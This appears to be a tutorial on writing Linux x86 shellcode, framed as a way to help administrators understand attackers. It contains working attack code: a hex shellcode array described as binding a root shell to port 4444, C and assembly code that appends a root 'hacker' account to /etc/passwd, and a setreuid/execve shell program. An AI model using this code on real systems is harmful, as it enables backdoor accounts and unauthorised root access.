@@ -1,0 +1,122 @@
+It's not an easy task to find a vulnerable service and find an exploit for it. It's also not easy to defend against users who might want to exploit y 
+our system, if you are a system administrator. However, writing an exploit by yourself, to convert a news line from bug tracker into a working lockpic 
+k, is much more difficult. This article is not a guide on writing exploits, nor an overview of popular vulnerabilities. This is a step-by-step guide o 
+n developing a shellcode, a crucial point of any exploit software. Hopefully, learning how they work will help conscientious and respectable developer 
+s and system administrators to understand how malefactors think and to defend their systems against them. 
+How an Exploit Works 
+ 
+Take any exploit downloaded from the internet that promises you an easy root shell on a remote machine, and examine its source code. Find the most un 
+intelligible piece of the code; it will be there, for sure. Most probably, you will find a several lines of strange and unrelated symbols; som 
+ething like this: 
+char shellcode[] = 
+"\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x8a" 
+"\xd4\xf2\xe7\x83\xeb\xfc\xe2\xf4\xbb\x0f\xa1\xa4\xd9\xbe\xf0\x8d" 
+"\xec\x8c\x6b\x6e\x6b\x19\x72\x71\xc9\x86\x94\x8f\x9b\x88\x94\xb4" 
+"\x03\x35\x98\x81\xd2\x84\xa3\xb1\x03\x35\x3f\x67\x3a\xb2\x23\x04" 
+"\x47\x54\xa0\xb5\xdc\x97\x7b\x06\x3a\xb2\x3f\x67\x19\xbe\xf0\xbe" 
+"\x3a\xeb\x3f\x67\xc3\xad\x0b\x57\x81\x86\x9a\xc8\xa5\xa7\x9a\x8f" 
+"\xa5\xb6\x9b\x89\x03\x37\xa0\xb4\x03\x35\x3f\x67"; 
+ 
+This is shellcode, also sometimes referred to as "bytecode." Its content is not a magic word or random symbols. This is a set of low-level machine co 
+mmands, the same as are in an executable file. This example shellcode opens port 4444 on a local linux box and ties a Bourne shell to it with root pri 
+vileges. With a shellcode, you can also reboot a system, send a file to an email, etc. The main task for an exploit program is therefore to make this  
+shellcode work. 
+ 
+Take, for example, a widely known error-buffer overflow. Developers often check data that has been received as input for functions. A simple example{ 
+ : } the developer creates a dynamic array, allocates for it 100 bytes, and does not control the real number of elements. All elements that are out of 
+ the bounds of this array will be put into a stack, and a so-called buffer overflow will occur. An exploit's task is to overflow a buffer and, after t 
+hat, change the return address of system execution to the address of the shellcode. If a shellcode can get control, it will be executed. It's pretty s 
+imple. 
+ 
+As I already said, this article is not a guide for writing exploits. There are many repositories with existing shellcodes (shellcode.org, Metasploit) 
+; however, it is not always enough. A shellcode is a low-level sequence of machine commands closely tied to a dedicated processor architecture and 
+ operating system. This is why understanding how it works can help prevent intrusions into your environment. 
+What Is It For? 
+ 
+To follow along, I expect you to have at least minimal assembly knowledge. As a platform for experiments, I chose Linux with a 32-bit x86 processor.  
+Most exploits are intended for Unix services; therefore, they are of most interest. You need several additional tools: Netwide Assembler (nasm 
+), ndisasm, and hexdump. Most Linux distributions include these by default. 
+The Process of Building 
+ 
+Shellcode stubs are usually written in assembler; however, it is easier to explain how one works by building it in C and then rewriting the same  
+code in assembly. This is C code for appending a user into /etc/passwd: 
+#include <stdio.h> 
+#include <fcntl.h> 
+ 
+main() { 
+char *filename = "/etc/passwd"; 
+char *line = "hacker:x:0:0::/:/bin/sh\n"; 
+int f_open; 
+f_open = open(filename,O_WRONLY|O_APPEND); 
+write(f_open, line, strlen(line)); 
+close(f_open); 
+exit(0); 
+} 
+ 
+All of the code is pretty simple, except maybe the open() function. The constant O_WRONLY|O_APPEND given as a parameter opens the file fact for writi 
+ng and appends the new data to the end of the file. 
+ 
+Here is a more usable example: executing a Bourne shell: 
+#include <stdio.h> 
+ 
+main() { 
+char *name[2]; 
+name[0] = "/bin/sh"; 
+name[1] = NULL; 
+setreuid(0, 0); 
+execve(name[0],name, NULL); 
+} 
+ 
+The setreuid(0,0) call attempts to obtain root privileges (if it is possible). execve(const char filename,const char[] argv, const char[{ 
+ ] } envp) is a main system call that executes any binary file or script. It has three parameters: filename is a full path to an executable file,  
+argv[] is an array of arguments, and envp[] is an array of strings in the format key=value. Both arrays must end with a NULL element. 
+ 
+Now consider how to rewrite the C code given in the first example in assembly. x86 assembly executes system calls with help of a special system inter 
+rupt that reads the number of the function from the EAX register and then executes the corresponding function. The function codes are in the file /usr 
+/include/asm/unistd.h. For example, a line in this file, #define __NR_ open 5, means that the function open() has the identification number 5. In a si 
+milar way, you can find all other function codes: exit() is 1, close() is 6, setreuid() is 70, and execve() is 11. This knowledge is enough to wri 
+te a simple working application. The /etc/passwd amendment application code in assembly is: 
+section .data 
+filename db '/etc/passwd', 0 
+line db 'hacker:x:0:0::/:/bin/sh',0x0a 
+ 
+section .text 
+global _start 
+ 
+_start: 
+; open(filename,O_WRONLY|O_APPEND) 
+mov eax, 5 
+mov ebx, filename 
+mov ecx, 1025 
+int 0x80 
+mov ebx, eax 
+ 
+; write(f_open, line, 24) 
+mov eax, 4 
+mov ecx, line 
+mov edx, 24 
+int 0x80 
+ 
+; close(f_open) 
+mov eax, 6 
+int 0x80 
+ 
+; exit(0) 
+mov eax, 1 
+mov ebx, 0 
+int 0x80 
+ 
+It's a well-known fact that an assembly program consists of three segments: the data segment, which contains variables; the code segment cont 
+aining code instructions; and a stack segment, which provides a special memory area for storing data. This example uses only data and code segment 
+s. The operators section .data and section .text mark their beginnings. A data segment contains the declaration of two char variables: name and li 
+ne, consisting of a set of bytes (see the db mark in the definition). 
+ 
+The code segment starts from a declaration of an entry point, global _start. This tells the system that the application code starts at the _start lab 
+el. 
+ 
+The next steps are easy; to call open(), set the EAX register to the appropriate function code: 5. After that, pass parameters for the functi 
+on. The most simple way of passing parameters is to use the registers EBX, ECX, and EDX. EBX gets the first function parameter, the address of the beg 
+inning of the filename string variable, which contains a full path to a file and a finishing zero char (most system functions operating with strings d 
+emand a trailing null). The ECX register gets the second parameter, giving information about file open mode (a constant O_WRONLY|O_APPEND in a numeric 
+ format). With all of the parameters set, the code calls interrupt 0x80. It will read the function code from EAX and calls an appropriate function. Af 
+ter completing the call, the application will continue, calling write(), close(), and exit() in exactly the same way.
